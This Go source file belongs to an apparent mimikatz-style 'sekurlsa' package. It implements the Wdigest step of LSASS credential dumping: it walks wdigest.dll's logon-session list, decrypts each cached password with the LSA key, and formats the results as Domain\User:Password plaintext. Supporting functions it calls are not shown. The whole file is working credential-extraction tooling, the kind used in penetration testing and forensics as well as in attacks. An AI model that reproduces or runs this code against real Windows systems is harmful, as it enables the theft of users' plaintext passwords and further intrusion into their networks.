package sekurlsa

import (
	"encoding/binary"
	"fmt"
)

// WdigestLayout captures per-build offsets inside a
// KIWI_WDIGEST_LIST_ENTRY node and the encrypted-password UNICODE_STRING
// it carries. Field offsets are byte distances from the start of the
// node.
//
// Set NodeSize to the smallest size that covers every offset we read.
// Set NodeSize=0 (zero value) and the Wdigest walker is skipped — a
// template that lacks Wdigest support stays inert without runtime
// cost.
type WdigestLayout struct {
	NodeSize uint32

	// LUID — locally-unique session id. Used to merge a Wdigest
	// credential into the matching MSV1_0 LogonSession by LUID.
	LUIDOffset uint32

	// UNICODE_STRING fields. Buffer pointer is dereferenced to read
	// the actual UTF-16 bytes from a separate region.
	UserNameOffset uint32
	DomainOffset   uint32

	// PasswordOffset is the UNICODE_STRING whose Buffer points at an
	// encrypted blob (size = Length). The walker decrypts each blob
	// with the lsaKey and surfaces the resulting UTF-16LE string.
	PasswordOffset uint32
}

// WdigestCredential is the credential payload extracted from a single
// Wdigest logon session. Plaintext is non-empty only when
// HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest
// \UseLogonCredential = 1 — Microsoft set the default to 0 in
// Windows 8.1 / KB2871997, so a successful extraction implies the
// target re-enabled cleartext credential caching.
type WdigestCredential struct {
	UserName    string
	LogonDomain string
	Password    string
	Found       bool // false if the password decrypted to all-zero
}

// AuthPackage satisfies the Credential interface.
func (WdigestCredential) AuthPackage() string { return "Wdigest" }

// String renders Domain\User:Password for log lines. Unlike the
// pwdump-shaped MSVCredential.String, Wdigest returns plaintext
// directly — there's no industry-standard "wdigest dump format" so
// we use the simplest unambiguous one.
func (c WdigestCredential) String() string {
	user := c.UserName
	if c.LogonDomain != "" {
		user = c.LogonDomain + `\` + user
	}
	return fmt.Sprintf("%s:%s", user, c.Password)
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
// Plaintext passwords are the most-sensitive credential surface in
// the result; wipe before discarding the Result.
func (c *WdigestCredential) wipe() {
	c.Password = ""
	c.Found = false
}

// extractWdigest walks wdigest.dll's logon-session list and decrypts
// every node's password. Returns one WdigestCredential per LUID that
// produced a non-empty plaintext.
//
// The list is a single doubly-linked LIST_ENTRY rooted at the
// `l_LogSessList` global inside wdigest.dll. Bucket count is 1
// (no hash table — wdigest is small enough to use a flat list).
//
// Returns (nil, nil) without warning when the template lacks Wdigest
// support (WdigestLayout.NodeSize == 0) — this is the documented
// way to disable the walker per build.
//
// Returns (creds, warnings) where creds is keyed by LUID for cheap
// merge-by-LUID into the MSV-derived LogonSession set.
func extractWdigest(r *reader, wdigestModule Module, t *Template, lsaKey *lsaKey) (map[uint64]*WdigestCredential, []string) {
	if t.WdigestLayout.NodeSize == 0 || len(t.WdigestListPattern) == 0 {
		return nil, nil
	}
	listHead, err := resolveListHead(r, wdigestModule,
		t.WdigestListPattern, t.WdigestListWildcards, t.WdigestListOffset)
	if err != nil {
		return nil, []string{fmt.Sprintf("Wdigest list head: %v", err)}
	}
	creds := make(map[uint64]*WdigestCredential)
	const maxNodes = 1024
	warnings := walkLinkedList(r, listHead, t.WdigestLayout.NodeSize, maxNodes,
		func(node []byte, _ uint64) string {
			cred, luid, warn := decodeWdigestNode(r, node, t, lsaKey)
			if warn != "" {
				return warn
			}
			if cred.Found {
				c := cred
				creds[luid] = &c
			}
			return ""
		})
	return creds, warnings
}

// decodeWdigestNode projects a node-bytes blob through the layout
// to a (WdigestCredential, LUID). Returns ("", "warning") when the
// password decryption fails; ("", "") when the node has no password
// (typical for SYSTEM / network sessions).
func decodeWdigestNode(r *reader, node []byte, t *Template, lsaKey *lsaKey) (WdigestCredential, uint64, string) {
	l := t.WdigestLayout
	if uint32(len(node)) < l.NodeSize {
		return WdigestCredential{}, 0, fmt.Sprintf("Wdigest node too small: %d < %d", len(node), l.NodeSize)
	}

	luid := binary.LittleEndian.Uint64(node[l.LUIDOffset : l.LUIDOffset+8])
	username := readUnicodeString(r, node[l.UserNameOffset:l.UserNameOffset+16])
	domain := readUnicodeString(r, node[l.DomainOffset:l.DomainOffset+16])

	password, err := readEncryptedPassword(r, node[l.PasswordOffset:l.PasswordOffset+16], lsaKey)
	if err != nil {
		return WdigestCredential{}, luid, fmt.Sprintf("Wdigest %v", err)
	}

	cred := WdigestCredential{
		UserName:    username,
		LogonDomain: domain,
		Password:    password,
		Found:       password != "",
	}
	return cred, luid, ""
}

// decodeUTF16LEBytes converts a raw UTF-16LE byte buffer to a Go
// string, trimming trailing NUL pairs (CBC padding tail, ALG-2's
// PKCS#7 leftovers, etc.).
func decodeUTF16LEBytes(b []byte) string {
	// Trim trailing zero pairs and odd-byte tails left by CBC padding.
	for len(b) >= 2 && b[len(b)-1] == 0 && b[len(b)-2] == 0 {
		b = b[:len(b)-2]
	}
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	if len(b) == 0 {
		return ""
	}
	u16 := make([]uint16, len(b)/2)
	for i := range u16 {
		u16[i] = binary.LittleEndian.Uint16(b[i*2 : i*2+2])
	}
	return decodeUTF16(u16)
}

// mergeWdigest grafts Wdigest credentials onto matching MSV
// LogonSession entries by LUID. Wdigest sessions whose LUID is
// absent from `sessions` are surfaced as new sessions — UserName /
// Domain come from the Wdigest node so callers get a recognisable
// session shell even without the matching MSV side.
func mergeWdigest(sessions []LogonSession, wdig map[uint64]*WdigestCredential) []LogonSession {
	return mergeByLUID(sessions, wdig, func(luid uint64, c *WdigestCredential) LogonSession {
		return LogonSession{
			LUID:        luid,
			UserName:    c.UserName,
			LogonDomain: c.LogonDomain,
			Credentials: []Credential{c},
		}
	})
}
